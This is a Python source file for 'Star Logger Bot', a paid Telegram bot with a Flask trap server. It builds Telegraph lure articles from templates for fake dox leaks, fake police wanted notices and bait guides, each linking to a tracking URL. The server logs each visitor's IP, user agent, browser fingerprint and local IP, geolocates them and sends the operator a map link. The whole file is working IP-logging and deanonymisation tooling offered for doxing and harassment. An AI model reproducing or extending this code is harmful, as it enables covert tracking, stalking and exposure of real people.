# language: Python, file: main.py, runtime: Python 3.10+, target: Telegram + Telegraph + Flask trap
import os
import json
import time
import string
import secrets
import sqlite3
import threading
from datetime import datetime, timedelta
from decimal import Decimal
from dotenv import load_dotenv

import requests
import telebot
from telebot import types
from telegraph import Telegraph

# ---------- CONFIG ----------
load_dotenv()

BOT_TOKEN        = os.environ["BOT_TOKEN"]
CRYPTO_PAY_TOKEN = os.environ["CRYPTO_PAY_TOKEN"]
ADMIN_IDS        = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x]
LOG_CHAT_ID      = int(os.environ.get("LOG_CHAT_ID", "0"))
BASE_URL         = os.environ.get("BASE_URL", "https://laplace.fadehost.com")
TRAP_PORT        = int(os.environ.get("TRAP_PORT", "8080"))
DB_PATH          = os.environ.get("DB_PATH", "database2.db")

# ---------- BOT / TELEGRAPH ----------
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
telegraph = Telegraph()
telegraph.create_account(short_name='Star_Logger_Bot')

# ---------- DB ----------
def _conn():
    c = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def db_init():
    with _conn() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE,
            username TEXT,
            created_at TEXT
        );
        CREATE TABLE IF NOT EXISTS balance (
            user_id INTEGER PRIMARY KEY,
            amount REAL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS links (
            slug TEXT PRIMARY KEY,
            title TEXT,
            logger_url TEXT,
            created_by INTEGER,
            created_at INTEGER,
            hits INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT,
            ip TEXT,
            ts INTEGER,
            ua TEXT,
            ref TEXT,
            lang TEXT,
            geo TEXT,
            fp TEXT
        );
        """)

def is_registered(user_id):
    with _conn() as c:
        return c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone() is not None

def register(user_id, username):
    with _conn() as c:
        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?,?,?)",
                  (user_id, username, datetime.now().isoformat()))

def get_balance(user_id):
    with _conn() as c:
        r = c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()
        return r["amount"] if r else 0.0

def add_balance(user_id, amount):
    with _conn() as c:
        c.execute("INSERT INTO balance (user_id, amount) VALUES (?,?) "
                  "ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?",
                  (user_id, amount, amount))
        return c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()["amount"]

def sub_balance(user_id, amount):
    cur = get_balance(user_id)
    if cur < amount:
        return False, cur
    with _conn() as c:
        c.execute("UPDATE balance SET amount = amount - ? WHERE user_id=?", (amount, user_id))
        return True, cur - amount

def user_counts():
    with _conn() as c:
        total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        with_bal = c.execute("SELECT COUNT(*) FROM balance WHERE amount > 0").fetchone()[0]
        return total, with_bal

def all_user_ids():
    with _conn() as c:
        return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]

def create_link(slug, title, logger_url, created_by):
    with _conn() as c:
        c.execute("INSERT INTO links (slug,title,logger_url,created_by,created_at) VALUES (?,?,?,?,?)",
                  (slug, title, logger_url, created_by, int(time.time())))

def get_link(slug):
    with _conn() as c:
        return c.execute("SELECT * FROM links WHERE slug=?", (slug,)).fetchone()

def bump_hits(slug):
    with _conn() as c:
        c.execute("UPDATE links SET hits=hits+1 WHERE slug=?", (slug,))

def add_hit(slug, ip, ua, ref, lang):
    with _conn() as c:
        cur = c.execute("INSERT INTO hits (slug,ip,ts,ua,ref,lang,geo,fp) VALUES (?,?,?,?,?,?,?,?)",
                        (slug, ip, int(time.time()), ua, ref, lang, "{}", "{}"))
        return cur.lastrowid

def update_hit(hit_id, geo_json, fp_json):
    with _conn() as c:
        c.execute("UPDATE hits SET geo=?, fp=? WHERE id=?", (geo_json, fp_json, hit_id))

def get_hits(slug, limit=50):
    with _conn() as c:
        return c.execute("SELECT * FROM hits WHERE slug=? ORDER BY ts DESC LIMIT ?",
                         (slug, limit)).fetchall()

def get_user_links(user_id, limit=50):
    with _conn() as c:
        return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?",
                         (user_id, limit)).fetchall()

# ---------- TRAP SERVER ----------
def _ip_geo(ip):
    if ip.startswith(("127.", "10.", "192.168.", "172.")):
        return {"local": True, "ip": ip}
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,country,countryCode,regionName,city,zip,lat,lon,"
                              "timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"},
            timeout=5)
        return r.json() if r.ok else {"err": True, "ip": ip}
    except requests.RequestException:
        return {"err": True, "ip": ip}

def run_trap_server():
    from flask import Flask, request, Response, abort
    app = Flask(__name__)
    here = os.path.dirname(os.path.abspath(__file__))
    page_path = os.path.join(here, "fingerprint.html")

    def _page():
        with open(page_path, encoding="utf-8") as f:
            return f.read()

    def _client_ip(req):
        xff = req.headers.get("X-Forwarded-For", "")
        cf = req.headers.get("CF-Connecting-IP", "")
        if cf:
            return cf.strip()
        if xff:
            return xff.split(",")[0].strip()
        return (req.remote_addr or "").strip()

    @app.route("/t/<slug>")
    def trap(slug):
        link = get_link(slug)
        if not link:
            abort(404)
        ip = _client_ip(request)
        ua = request.headers.get("User-Agent", "-")
        ref = request.headers.get("Referer", "-")
        lang = request.headers.get("Accept-Language", "-")
        add_hit(slug, ip, ua, ref, lang)
        fallback = link["logger_url"] if link["logger_url"] else "https://www.google.com"
        html = _page().replace("__SLUG__", slug).replace("__FALLBACK__", fallback)
        r = Response(html, mimetype="text/html")
        r.headers["Cache-Control"] = "no-store"
        r.headers["Referrer-Policy"] = "no-referrer"
        return r

    @app.route("/fp/<slug>", methods=["POST"])
    def fp(slug):
        try:
            data = request.get_json(force=True)
        except Exception:
            return {"ok": False}, 400
        ip = _client_ip(request)
        geo = _ip_geo(ip)
        with _conn() as c:
            row = c.execute(
                "SELECT id FROM hits WHERE slug=? AND ip=? ORDER BY ts DESC LIMIT 1",
                (slug, ip)).fetchone()
            if row:
                update_hit(row["id"],
                           json.dumps(geo, ensure_ascii=False),
                           json.dumps(data, ensure_ascii=False))
                bump_hits(slug)
        notify_admin_hit(slug, ip, geo, data)
        return {"ok": True}

    @app.route("/healthz")
    def health():
        return "ok"

    print(f"[*] trap server on 0.0.0.0:{TRAP_PORT}")
    app.run(host="0.0.0.0", port=TRAP_PORT, threaded=True, use_reloader=False)

# ---------- UTIL ----------
def send_log(text):
    try:
        bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
    except Exception:
        pass

def slug_gen(n=8):
    a = string.ascii_letters + string.digits
    return "".join(secrets.choice(a) for _ in range(n))

def make_trap_link(title, created_by, fallback="https://www.google.com"):
    slug = slug_gen()
    create_link(slug, title, fallback, created_by)
    return f"{BASE_URL}/t/{slug}", slug

def build_html(text, trap_url, img_url=None):
    parts = [f"<p>{text}</p>", f'<p><a href="{trap_url}">Продолжение тут</a></p>']
    if img_url:
        parts.append(f'<img src="{img_url}">')
    return "<br>".join(parts)

def make_article(title, text, img_url, template_name, author_id):
    trap_url, slug = make_trap_link(title, author_id)
    html = build_html(text, trap_url, img_url)
    page = telegraph.create_page(title=title, html_content=html)
    url = f"https://telegra.ph/{page['path']}"
    msg = (
        f"<b>⭐️Star Logger Bot⭐️</b>\n"
        f"<b>⭐️Статья создана</b>\n"
        f"=============================\n"
        f"⭐️Тема: {title}\n"
        f"⭐️Ловушка: <code>{trap_url}</code>\n"
        f"=============================\n"
        f"⭐️Ссылка: {url}"
    )
    return msg, url, slug

# ---------- MENUS ----------
def show_main_menu(message):
    uid = message.chat.id
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url='https://t.me/+FfSgUJx-g4s0ZTE6'))
    kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
    kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
    kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(uid, had,
            f'<b>⭐️Star Logger Bot!\n=============================\n'
            f'⭐️Главное меню\n=============================\n'
            f'💰Баланс: {get_balance(uid):.2f}$\n'
            f'🆔 ID: {uid}</b>', reply_markup=kb)

def admin_menu(chat_id):
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "<b>❌Нет доступа.</b>")
        return
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("💰Выдать баланс", callback_data='admin_give_bal'))
    kb.add(types.InlineKeyboardButton("⭐️Рассылка", callback_data='admin_broadcast'))
    kb.add(types.InlineKeyboardButton("⭐️Статистика", callback_data='admin_stats'))
    kb.add(types.InlineKeyboardButton("⭐️Отправить БД", callback_data='admin_dump'))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(chat_id, had, caption='<b>⭐️Админ-меню</b>', reply_markup=kb)

# ---------- START ----------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = message.from_user.id
    username = message.from_user.username or ""
    first = not is_registered(uid)
    if first:
        register(uid, username)
        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")

    if first:
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Продолжить", callback_data='continue'))
        with open('had2.jpg', 'rb') as had:
            bot.send_photo(uid, had,
                '<b>💎Приветствуем в Star Logger Bot!</b>', reply_markup=kb)
        return

    show_main_menu(message)

# ---------- CALLBACKS ----------
@bot.callback_query_handler(func=lambda c: c.data == 'continue')
def cb_continue(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    show_main_menu(call.message)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'home')
def cb_home(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    show_main_menu(call.message)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
def cb_cabinet(call):
    uid = call.message.chat.id
    links = get_user_links(uid, 10)
    total_hits = sum(l["hits"] for l in links)
    lines = [
        "<b>⭐️Star Logger Bot",
        "=============================",
        f"🆔 ID: <code>{uid}</code>",
        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
        f"🔗 Линков: {len(links)}",
        f"🎯 Хитов: {total_hits}",
        "=============================",
        "📙 Последние ссылки:",
    ]
    if not links:
        lines.append("— пусто")
    for l in links:
        lines.append(f"<code>{l['slug']}</code> · {l['title'] or '—'} · hits {l['hits']}")
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("💰Пополнить баланс", callback_data="topup"))
    kb.add(types.InlineKeyboardButton("⚙️Support", url='https://t.me/StarLoggerSupportbot'))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
    try:
        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id,
                                 caption="\n".join(lines), reply_markup=kb)
    except Exception:
        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
    bot.answer_callback_query(call.id)

# ---------- PAYMENT / TOPUP ----------
TOPUP_AMOUNTS = [1, 3, 5, 10, 15, 25]

def get_exchange_rates():
    r = requests.get("https://pay.crypt.bot/api/getExchangeRates",
                     headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}, timeout=10)
    if r.ok and r.json().get("ok"):
        return r.json()["result"]
    return []

def convert_to_crypto(amount, asset):
    for rate in get_exchange_rates():
        if rate["source"] == asset and rate["target"] == "USD":
            return Decimal(str(amount)) / Decimal(str(rate["rate"]))
    raise ValueError(f"Не найден курс для {asset}")

def generate_payment_link(asset, amount):
    r = requests.post("https://pay.crypt.bot/api/createInvoice",
                      headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN},
                      json={"asset": asset, "amount": float(amount)}, timeout=10)
    if r.ok:
        inv = r.json().get("result") or {}
        return inv.get("pay_url"), inv.get("invoice_id")
    return None, None

def get_invoice_status(invoice_id):
    r = requests.get(f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}",
                     headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}, timeout=10)
    if r.ok and r.json().get("ok"):
        items = (r.json().get("result") or {}).get("items") or []
        if items:
            it = items[0]
            return it.get("status"), it.get("pay_url"), Decimal(str(it.get("amount", 0)))
    return None, None, None

@bot.callback_query_handler(func=lambda c: c.data == 'topup')
def cb_topup(call):
    kb = types.InlineKeyboardMarkup(row_width=3)
    for amt in TOPUP_AMOUNTS:
        kb.add(types.InlineKeyboardButton(f"{amt}$", callback_data=f"topamt_{amt}"))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="cabinet"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption="<b>💰Выберите сумму пополнения:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('topamt_'))
def cb_topamt(call):
    amt = call.data.split("_")[1]
    kb = types.InlineKeyboardMarkup()
    for t, cur in [("💵 USDT", "USDT"), ("💎 TON", "TON"), ("🪙 BTC", "BTC"), ("💶 ETH", "ETH")]:
        kb.add(types.InlineKeyboardButton(t, callback_data=f"topcur_{cur}_{amt}"))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="topup"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption="<b>💸Выберите валюту:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('topcur_'))
def cb_topcur(call):
    _, currency, amt = call.data.split('_')
    amount_usd = float(amt)
    try:
        crypto_amount = convert_to_crypto(amount_usd, currency)
        pay_url, inv_id = generate_payment_link(currency, crypto_amount)
        if pay_url and inv_id:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("💸Проверить оплату",
                   callback_data=f"check_payment:{call.from_user.id}:{inv_id}:{amt}"))
            kb.add(types.InlineKeyboardButton("💸Счёт", url=pay_url))
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                caption=f"<b>💸Счёт на {amt}$</b>", reply_markup=kb)
        else:
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                caption="❌Не удалось создать счёт.")
    except ValueError as e:
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
            caption=f"❌{e}")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('check_payment:'))
def cb_check_pay(call):
    parts = call.data.split(':')
    if len(parts) < 3:
        bot.answer_callback_query(call.id, "❌Ошибка", show_alert=True)
        return
    _, uid_s, inv_id, amt_s = parts[0], parts[1], parts[2], (parts[3] if len(parts) > 3 else "0")
    if int(uid_s) != call.from_user.id:
        bot.answer_callback_query(call.id, "❌Чужая оплата.", show_alert=True)
        return
    status, _, amount = get_invoice_status(inv_id)
    if status == "paid":
        new_bal = add_balance(call.from_user.id, float(amt_s))
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
            caption=f"✅Оплата подтверждена.\n💰Баланс: <b>{new_bal:.2f}$</b>")
    else:
        bot.answer_callback_query(call.id, "❌Оплата не найдена.", show_alert=True)

# ---------- ADMIN ----------
@bot.message_handler(commands=['admin'])
def cmd_admin(m):
    admin_menu(m.chat.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
def cb_admin_give(call):
    bot.send_message(call.message.chat.id, "<b>⭐️ID и сумму через пробел:</b>")
    bot.register_next_step_handler(call.message, _admin_give_step)
    bot.answer_callback_query(call.id)

def _admin_give_step(message):
    parts = message.text.split()
    if len(parts) < 2 or not parts[0].lstrip("-").isdigit():
        bot.reply_to(message, "❌ Формат: <code>123456789 10</code>")
        return
    uid, amount = int(parts[0]), float(parts[1])
    new_bal = add_balance(uid, amount)
    try:
        bot.send_message(uid, f"<b>💰Баланс пополнен на {amount:.2f}$. Текущий: {new_bal:.2f}$</b>")
    except Exception:
        pass
    bot.reply_to(message, f"✅ {uid} +{amount:.2f}$, теперь {new_bal:.2f}$")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_broadcast' and c.from_user.id in ADMIN_IDS)
def cb_admin_bc(call):
    bot.send_message(call.message.chat.id, "⭐️Текст рассылки:")
    bot.register_next_step_handler(call.message, _admin_bc_step)
    bot.answer_callback_query(call.id)

def _admin_bc_step(message):
    ok = fail = 0
    for uid in all_user_ids():
        try:
            bot.send_message(uid, message.text)
            ok += 1
        except Exception:
            fail += 1
    bot.reply_to(message, f"✅Отправлено: {ok}, ошибок: {fail}")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_stats' and c.from_user.id in ADMIN_IDS)
def cb_admin_stats(call):
    total, with_bal = user_counts()
    bot.send_message(call.message.chat.id,
        f"<b>⭐️Star Logger Bot</b>\n👥Всего: {total}\n💰С балансом: {with_bal}")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_dump' and c.from_user.id in ADMIN_IDS)
def cb_admin_dump(call):
    with open(DB_PATH, 'rb') as f:
        bot.send_document(call.message.chat.id, f)
    bot.answer_callback_query(call.id)

# ---------- LOGGER ----------
@bot.callback_query_handler(func=lambda c: c.data == 'logger')
def cb_logger(call):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
    kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
    kb.add(types.InlineKeyboardButton("📙Розыски", callback_data="cat_wanted"))
    kb.add(types.InlineKeyboardButton("📙Свой текст", callback_data="tpl_custom"))
    kb.add(types.InlineKeyboardButton("⭐️Главное меню", callback_data="home"))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(call.message.chat.id, had, caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    bot.answer_callback_query(call.id)

TEMPLATES = {
    "tpl_dox_v1": "Dox V1", "tpl_dox_v2": "Dox V2",
    "tpl_dox_v3": "Dox V3", "tpl_dox_v4": "Dox V4",
    "tpl_man_v1": "Manual V1", "tpl_man_v2": "Manual V2",
    "tpl_mvd_v1": "Розыск МВД V1", "tpl_mvd_v2": "Розыск МВД V2",
    "tpl_sport_v1": "СпортОтряд V1", "tpl_sport_v2": "СпортОтряд V2",
    "tpl_money_v1": "Заработок V1", "tpl_money_v2": "Заработок V2",
}

TEXTS = {
    "tpl_dox_v1": "Данный человек {title} очень часто пиздел и разбрасывался словами. Мы решили собрать его данные в кучу и слить вам, данные приложены ниже.",
    "tpl_dox_v2": "Данная личность {title} давно сидит в сети Telegram и мешает пользователям. Данные приложены ниже в полном формате.",
    "tpl_dox_v3": "Д0КС ТАКОЙ ЛИЧНОСТИ КАК {title}. Данная личность неоднократно пиздела дохуя лишнего — данные приложены ниже.",
    "tpl_dox_v4": "Такая личность как {title} — много пиздит и угрожает. Его данные солью на общее обозрение — они приложены ниже.",
    "tpl_man_v1": "Здравствуй, благодарю за покупку мануала от {title}. Начнём с раздела: безопасность и настройка анонимности.",
    "tpl_man_v2": "MANUAL — ликвидация анонимности: стратегии защиты. Мануал от {title}. В современном мире сохранение анонимности важно.",
    "tpl_mvd_v1": "Наиболее опасный разыскиваемый преступник в Telegram {title}. МВД России просит помочь в розыске.",
    "tpl_mvd_v2": "Здравствуйте, граждане! В розыск объявлен пользователь Telegram с ником {title}. МВД просит помочь.",
    "tpl_sport_v1": "Личность {title} разыскивается СпортОтрядом. Вознаграждение 40.000р.",
    "tpl_sport_v2": "Личность {title} задолжала людям денег. Просьба отыскать и наказать. Вознаграждение 40.000р.",
    "tpl_money_v1": "Связка TikTok+YouTube: как монетизировать каналы на развлекательном контенте. {title} — лох.",
    "tpl_money_v2": "Крипто-пираты: заработок на seed-фразах. 1000$ в месяц. {title} — лох.",
}

@bot.callback_query_handler(func=lambda c: c.data in ("cat_dox", "cat_bait", "cat_wanted"))
def cb_cat(call):
    kb = types.InlineKeyboardMarkup(row_width=1)
    if call.data == "cat_dox":
        keys = ("tpl_dox_v1", "tpl_dox_v2", "tpl_dox_v3", "tpl_dox_v4")
    elif call.data == "cat_bait":
        keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
    else:
        keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
    for k in keys:
        kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

_pending = {}

@bot.callback_query_handler(func=lambda c: c.data in TEMPLATES)
def cb_template(call):
    _pending[call.from_user.id] = call.data
    bot.send_message(call.message.chat.id, "<b>⭐️Введите ник/имя для шаблона:</b>")
    bot.register_next_step_handler(call.message, _ask_img)
    bot.answer_callback_query(call.id)

def _ask_img(message):
    key = _pending.get(message.from_user.id)
    if not key:
        return
    title = message.text.strip()[:80]
    _pending[message.from_user.id] = (key, title)
    bot.send_message(message.chat.id, "<b>⭐️URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _make_step)

def _make_step(message):
    data = _pending.pop(message.from_user.id, None)
    if not data or not isinstance(data, tuple):
        return
    key, title = data
    img = None if message.text.strip() == "/skip" else message.text.strip()
    text = TEXTS[key].format(title=title)
    msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id)
    bot.send_message(message.chat.id, msg)
    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\n"
             f"Тема: {title}\nЛовушка: <code>{BASE_URL}/t/{slug}</code>\nСтатья: {url}")

@bot.callback_query_handler(func=lambda c: c.data == "tpl_custom")
def cb_custom(call):
    bot.send_message(call.message.chat.id, "<b>⭐️Введите заголовок:</b>")
    bot.register_next_step_handler(call.message, _cust_title)
    bot.answer_callback_query(call.id)

_custom = {}

def _cust_title(message):
    _custom[message.from_user.id] = {"title": message.text.strip()[:80]}
    bot.send_message(message.chat.id, "<b>⭐️Введите текст:</b>")
    bot.register_next_step_handler(message, _cust_text)

def _cust_text(message):
    _custom[message.from_user.id]["text"] = message.text
    bot.send_message(message.chat.id, "<b>⭐️URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _cust_img)

def _cust_img(message):
    d = _custom.pop(message.from_user.id, None)
    if not d:
        return
    img = None if message.text.strip() == "/skip" else message.text.strip()
    msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id)
    bot.send_message(message.chat.id, msg)
    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\n"
             f"Ловушка: <code>{BASE_URL}/t/{slug}</code>\nСтатья: {url}")

# ---------- HIT NOTIFY ----------
def notify_admin_hit(slug, ip, geo, fp):
    link = get_link(slug)
    title = link["title"] if link else slug
    geo_str = (f"{geo.get('country','-')}, {geo.get('city','-')} "
               f"({geo.get('lat','-')},{geo.get('lon','-')})"
               if geo and not geo.get("err") else "geo unavailable")
    fp_str = (f"{fp.get('platform','-')} · {fp.get('screen','-')} · "
              f"{fp.get('cores','-')} cores · {fp.get('timezone','-')}")
    text = (
        f"<b>🎯 hit — {title}</b>\n"
        f"slug <code>{slug}</code>\n"
        f"IP <code>{ip}</code>\n"
        f"geo {geo_str}\n"
        f"isp {geo.get('isp','-')} · asn {geo.get('as','-')}\n"
        f"proxy {geo.get('proxy',False)} · hosting {geo.get('hosting',False)}\n"
        f"ua <code>{(fp.get('ua') or '-')[:150]}</code>\n"
        f"{fp_str}\n"
        f"local ip <code>{fp.get('local_ip') or '—'}</code>"
    )
    kb = types.InlineKeyboardMarkup()
    if geo.get("lat"):
        kb.add(types.InlineKeyboardButton("🌍 Карта",
               url=f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"))
    kb.add(types.InlineKeyboardButton("🔗 ipinfo", url=f"https://ipinfo.io/{ip}"))
    for aid in ADMIN_IDS:
        try:
            bot.send_message(aid, text, reply_markup=kb, disable_web_page_preview=True)
        except Exception:
            pass
    send_log(text)

# ---------- ENTRY ----------
if __name__ == "__main__":
    db_init()
    threading.Thread(target=run_trap_server, daemon=True).start()
    print("[*] bot polling…")
    bot.infinity_polling()
